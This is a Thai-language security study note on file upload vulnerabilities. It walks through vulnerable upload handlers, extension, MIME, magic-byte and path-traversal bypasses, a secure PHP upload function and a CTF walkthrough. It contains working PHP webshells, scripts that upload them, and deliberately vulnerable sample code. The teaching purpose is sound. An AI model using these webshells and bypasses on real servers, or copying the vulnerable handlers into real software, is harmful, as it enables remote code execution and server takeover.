# File Upload Vulnerabilities

## What (อะไร)
File Upload Vulnerabilities เกิดขึ้นเมื่อเว็บแอปพลิเคชันอนุญาตให้ผู้ใช้อัปโหลดไฟล์โดยไม่มีการตรวจสอบความปลอดภัยที่เพียงพอ ช่องโหว่นี้อาจนำไปสู่การ Remote Code Execution (RCE), defacement, หรือการโจมตีประเภทอื่นๆ

ช่องโหว่ File Upload เป็นหนึ่งในช่องโหว่ที่อันตรายที่สุดใน OWASP Top 10 เพราะสามารถนำไปสู่การควบคุมเซิร์ฟเวอร์ได้โดยสมบูรณ์

> [!info] ความสำคัญ
> File Upload Vulnerabilities มักถูกใช้ในการอัปโหลด webshell เพื่อควบคุมเซิร์ฟเวอร์ และเป็นช่องทางที่ attackers ใช้บ่อยที่สุดในการเข้าถึงระบบ

## Landmark (จุดสังเกต)
การระบุช่องโหว่ File Upload:

1. **Upload Forms**: ฟอร์มที่มีการอัปโหลดไฟล์
2. **Weak Validation**: การตรวจสอบแค่ client-side หรือตรวจสอบไม่เพียงพอ
3. **Predictable Upload Path**: ทราบตำแหน่งที่ไฟล์ถูกเก็บ
4. **Execute Permissions**: ไฟล์ที่อัปโหลดสามารถถูก execute ได้
5. **No File Sanitization**: ไม่มีการทำความสะอาดชื่อไฟล์

> [!warning] เครื่องหมายเตือน
> - ฟอร์มอัปโหลดที่ไม่มีการจำกัดประเภทไฟล์
> - Error messages ที่เปิดเผยข้อมูลเกี่ยวกับ file path
> - Directory listing เปิดอยู่

## Types (ประเภท)

### 1. No Validation
ไม่มีการตรวจสอบไฟล์ใดๆ เลย - อัปโหลดอะไรก็ได้

```php
<?php
// โค้ดที่มีช่องโหว่ - ไม่มีการตรวจสอบเลย
if(isset($_FILES['file'])) {
    $target_path = "uploads/" . basename($_FILES['file']['name']);
    
    // อัปโหลดโดยไม่ตรวจสอบอะไรเลย
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        echo "File uploaded successfully!";
    }
}
?>
```

### 2. Extension Blacklist
ตรวจสอบแค่ extension และใช้ blacklist

```python
# โค้ดที่มีช่องโหว่ - blacklist ไม่ครอบคลุม
import os
from flask import Flask, request

BLACKLIST = ['.php', '.exe', '.sh']

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename
    
    # ตรวจสอบด้วย blacklist (bypass ได้ง่าย)
    if any(filename.endswith(ext) for ext in BLACKLIST):
        return "File type not allowed"
    
    file.save(f"uploads/{filename}")
    return "Upload successful"
```

### 3. Extension Whitelist
ตรวจสอบด้วย whitelist แต่อาจมีช่องโหว่

```php
<?php
// โค้ดที่มีช่องโหว่ - ตรวจสอบ extension อย่างเดียว
$allowed_extensions = ['jpg', 'png', 'gif'];
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if(!in_array($file_extension, $allowed_extensions)) {
    die("Invalid file type");
}

// ยังมีช่องโหว่ - ไม่ตรวจสอบ content จริงๆ
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
?>
```

### 4. MIME Type Validation
ตรวจสอบ Content-Type header

```javascript
// โค้ดที่มีช่องโหว่ - เชื่อ MIME type จาก client
const express = require('express');
const multer = require('multer');

const upload = multer({
  fileFilter: function (req, file, cb) {
    // ตรวจสอบ MIME type (แก้ไขได้จาก client)
    if (file.mimetype === 'image/jpeg' || file.mimetype === 'image/png') {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'));
    }
  }
});
```

### 5. Magic Bytes Validation
ตรวจสอบ magic bytes ของไฟล์

```python
# โค้ดที่ปลอดภัยกว่า - ตรวจสอบ magic bytes
import magic

def validate_image(file_path):
    # ใช้ magic bytes เพื่อตรวจสอบประเภทไฟล์จริงๆ
    mime = magic.Magic(mime=True)
    file_type = mime.from_file(file_path)
    
    allowed_types = ['image/jpeg', 'image/png', 'image/gif']
    return file_type in allowed_types
```

## Exploitation (การโจมตี)

### Extension Bypass Techniques

#### 1. Double Extension
ใช้ extension สองชั้น

```bash
# สร้างไฟล์ที่มี extension สองชั้น
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# หรือใช้ null byte (PHP < 5.3.4)
shell.php%00.jpg
```

#### 2. Case Manipulation
เปลี่ยน case ของ extension

```bash
# ใช้ตัวพิมพ์ผสม
webshell.PhP
webshell.pHp
webshell.PHP

# หรือใช้ Unicode characters
webshell.phṗ
```

#### 3. Adding Dots and Spaces
เพิ่ม dots หรือ spaces

```bash
# เพิ่ม trailing dots/spaces (Windows)
webshell.php.
webshell.php....
webshell.php[space]
```

### MIME Type Bypass

```python
# ใช้ Burp Suite หรือ Python requests เพื่อเปลี่ยน Content-Type
import requests

files = {
    'file': ('shell.php', 
             '<?php system($_GET["cmd"]); ?>', 
             'image/jpeg')  # แปลง MIME type เป็น image
}

# อัปโหลดโดยปลอม MIME type
response = requests.post('http://target.com/upload', files=files)
```

### Magic Bytes Bypass

```python
# เพิ่ม magic bytes ของ image ไว้ด้านหน้า PHP code
import binascii

# Magic bytes ของ JPEG
jpeg_magic = binascii.unhexlify('FFD8FFE0')

# PHP webshell
php_code = b'<?php system($_GET["cmd"]); ?>'

# รวมกัน
with open('shell.php.jpg', 'wb') as f:
    f.write(jpeg_magic)
    f.write(php_code)
```

### Polyglot Files
สร้างไฟล์ที่เป็นได้ทั้ง image และ PHP

```bash
# สร้าง polyglot JPEG-PHP
cat valid_image.jpg php_code.php > polyglot.php

# หรือใช้ exiftool ฝัง PHP code ใน metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

### Webshell Examples

#### PHP Webshell
```php
<?php
// Simple PHP webshell
if(isset($_GET['cmd'])) {
    // รัน command ที่ส่งมาทาง GET parameter
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

#### More Advanced Webshell
```php
<?php
// Advanced webshell with file operations
error_reporting(0);

// Command execution
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

// File upload
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}

// HTML interface
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Execute">
</form>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

### Path Traversal with File Upload

```python
# ใช้ path traversal เพื่ออัปโหลดไฟล์ไปยังตำแหน่งอื่น
import requests

files = {
    'file': ('../../var/www/html/shell.php',  # path traversal
             '<?php system($_GET["cmd"]); ?>',
             'application/x-php')
}

response = requests.post('http://target.com/upload', files=files)
```

## Tools & Resources

### Manual Testing
```bash
# ทดสอบอัปโหลดไฟล์ด้วย curl
curl -X POST -F "file=@shell.php" http://target.com/upload

# ทดสอบ path traversal
curl -X POST -F "file=@shell.php;filename=../../../shell.php" http://target.com/upload

# เปลี่ยน Content-Type
curl -X POST -F "file=@shell.php;type=image/jpeg" http://target.com/upload
```

### Burp Suite
- Intercept upload request
- Modify filename, Content-Type, magic bytes
- Test different bypass techniques

### Fuzz Extensions
```bash
# สร้าง wordlist ของ extensions เพื่อ fuzz
echo "php
phtml
php3
php4
php5
php7
phps
pht
phar" > extensions.txt

# ใช้ wfuzz หรือ ffuf
wfuzz -c -w extensions.txt -u http://target.com/upload.FUZZ
```

## Mitigation (การป้องกัน)

> [!tip] Best Practices
> 1. **Validate File Type**: ตรวจสอบทั้ง extension, MIME type, และ magic bytes
> 2. **Rename Files**: เปลี่ยนชื่อไฟล์เป็น random เสมอ
> 3. **Store Outside Webroot**: เก็บไฟล์นอก web directory
> 4. **Remove Execute Permission**: ห้ามให้ไฟล์ที่อัปโหลดมีสิทธิ์ execute
> 5. **Use Separate Domain**: ใช้ domain แยกสำหรับ user-uploaded content
> 6. **Implement File Size Limits**: จำกัดขนาดไฟล์
> 7. **Scan for Malware**: สแกนไฟล์ด้วย antivirus

### Secure Upload Implementation
```php
<?php
// โค้ดที่ปลอดภัย - การอัปโหลดที่มี validation หลายชั้น
function secure_upload($file) {
    // 1. ตรวจสอบ error
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return false;
    }
    
    // 2. ตรวจสอบขนาดไฟล์
    if ($file['size'] > 5000000) { // 5MB
        return false;
    }
    
    // 3. ตรวจสอบ MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($mime, $allowed_mimes)) {
        return false;
    }
    
    // 4. ตรวจสอบ extension
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $allowed_exts = ['jpg', 'jpeg', 'png', 'gif'];
    
    if (!in_array($ext, $allowed_exts)) {
        return false;
    }
    
    // 5. สร้างชื่อไฟล์ใหม่ (random)
    $new_filename = bin2hex(random_bytes(16)) . '.' . $ext;
    
    // 6. เก็บไฟล์นอก webroot
    $upload_dir = '/var/uploads/'; // นอก web directory
    $target_path = $upload_dir . $new_filename;
    
    // 7. อัปโหลดและตั้งค่า permissions
    if (move_uploaded_file($file['tmp_name'], $target_path)) {
        chmod($target_path, 0644); // ไม่ให้สิทธิ์ execute
        return $new_filename;
    }
    
    return false;
}
?>
```

## CTF Example: ImageHub Challenge

**Challenge Description:**
```
ImageHub - Easy (100 points)

We created a simple image sharing platform. 
Upload your favorite images!

URL: http://imagehub.ctf.local
```

**Reconnaissance:**
```bash
# ตรวจสอบหน้าเว็บ
curl http://imagehub.ctf.local

# พบฟอร์มอัปโหลดไฟล์
# - รองรับ JPG, PNG, GIF
# - แสดง uploaded files ที่ /uploads/
```

**Solution Steps:**

1. **ทดสอบอัปโหลดไฟล์ PHP:**
```bash
# สร้าง simple webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# ลองอัปโหลด
curl -X POST -F "file=@shell.php" http://imagehub.ctf.local/upload
# Error: Only image files allowed
```

2. **ทดสอบ Double Extension:**
```bash
# เปลี่ยนชื่อไฟล์
mv shell.php shell.php.jpg

# อัปโหลดอีกครั้ง
curl -X POST -F "file=@shell.php.jpg" http://imagehub.ctf.local/upload
# Success! File uploaded to /uploads/shell.php.jpg
```

3. **ตรวจสอบว่าไฟล์ถูก execute หรือไม่:**
```bash
# เข้าถึงไฟล์
curl http://imagehub.ctf.local/uploads/shell.php.jpg
# แสดงโค้ด PHP (ไม่ถูก execute)

# แสดงว่าเซิร์ฟเวอร์ไม่ execute .jpg
```

4. **ทดสอบ bypass ด้วย .htaccess:**
```bash
# สร้างไฟล์ .htaccess เพื่อให้ execute .jpg
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# อัปโหลด .htaccess
curl -X POST -F "file=@.htaccess" http://imagehub.ctf.local/upload
# Success!
```

5. **Execute webshell:**
```bash
# ตอนนี้ .jpg ถูก execute เป็น PHP แล้ว
curl "http://imagehub.ctf.local/uploads/shell.php.jpg?cmd=ls"
# flag.txt
# index.php
# uploads/

# อ่าน flag
curl "http://imagehub.ctf.local/uploads/shell.php.jpg?cmd=cat+flag.txt"
# CTF{f1l3_upl04d_1s_d4ng3r0us_af}
```

**Key Takeaways:**
- Double extension bypass อาจไม่ได้ผลถ้าเซิร์ฟเวอร์ไม่ execute extension นั้น
- `.htaccess` upload สามารถเปลี่ยน configuration ให้ execute ไฟล์ได้
- ควรป้องกันการอัปโหลด `.htaccess` และ config files อื่นๆ

## WikiLinks
- [[Web Application Security]]
- [[Remote Code Execution]]
- [[Path Traversal]]
- [[Webshells]]
- [[OWASP Top 10]]
- [[PHP Security]]
- [[Apache Configuration]]

## Tags
#file-upload #rce #webshell #bypass #php #web-security

---
**Last Updated:** 2026-06-16
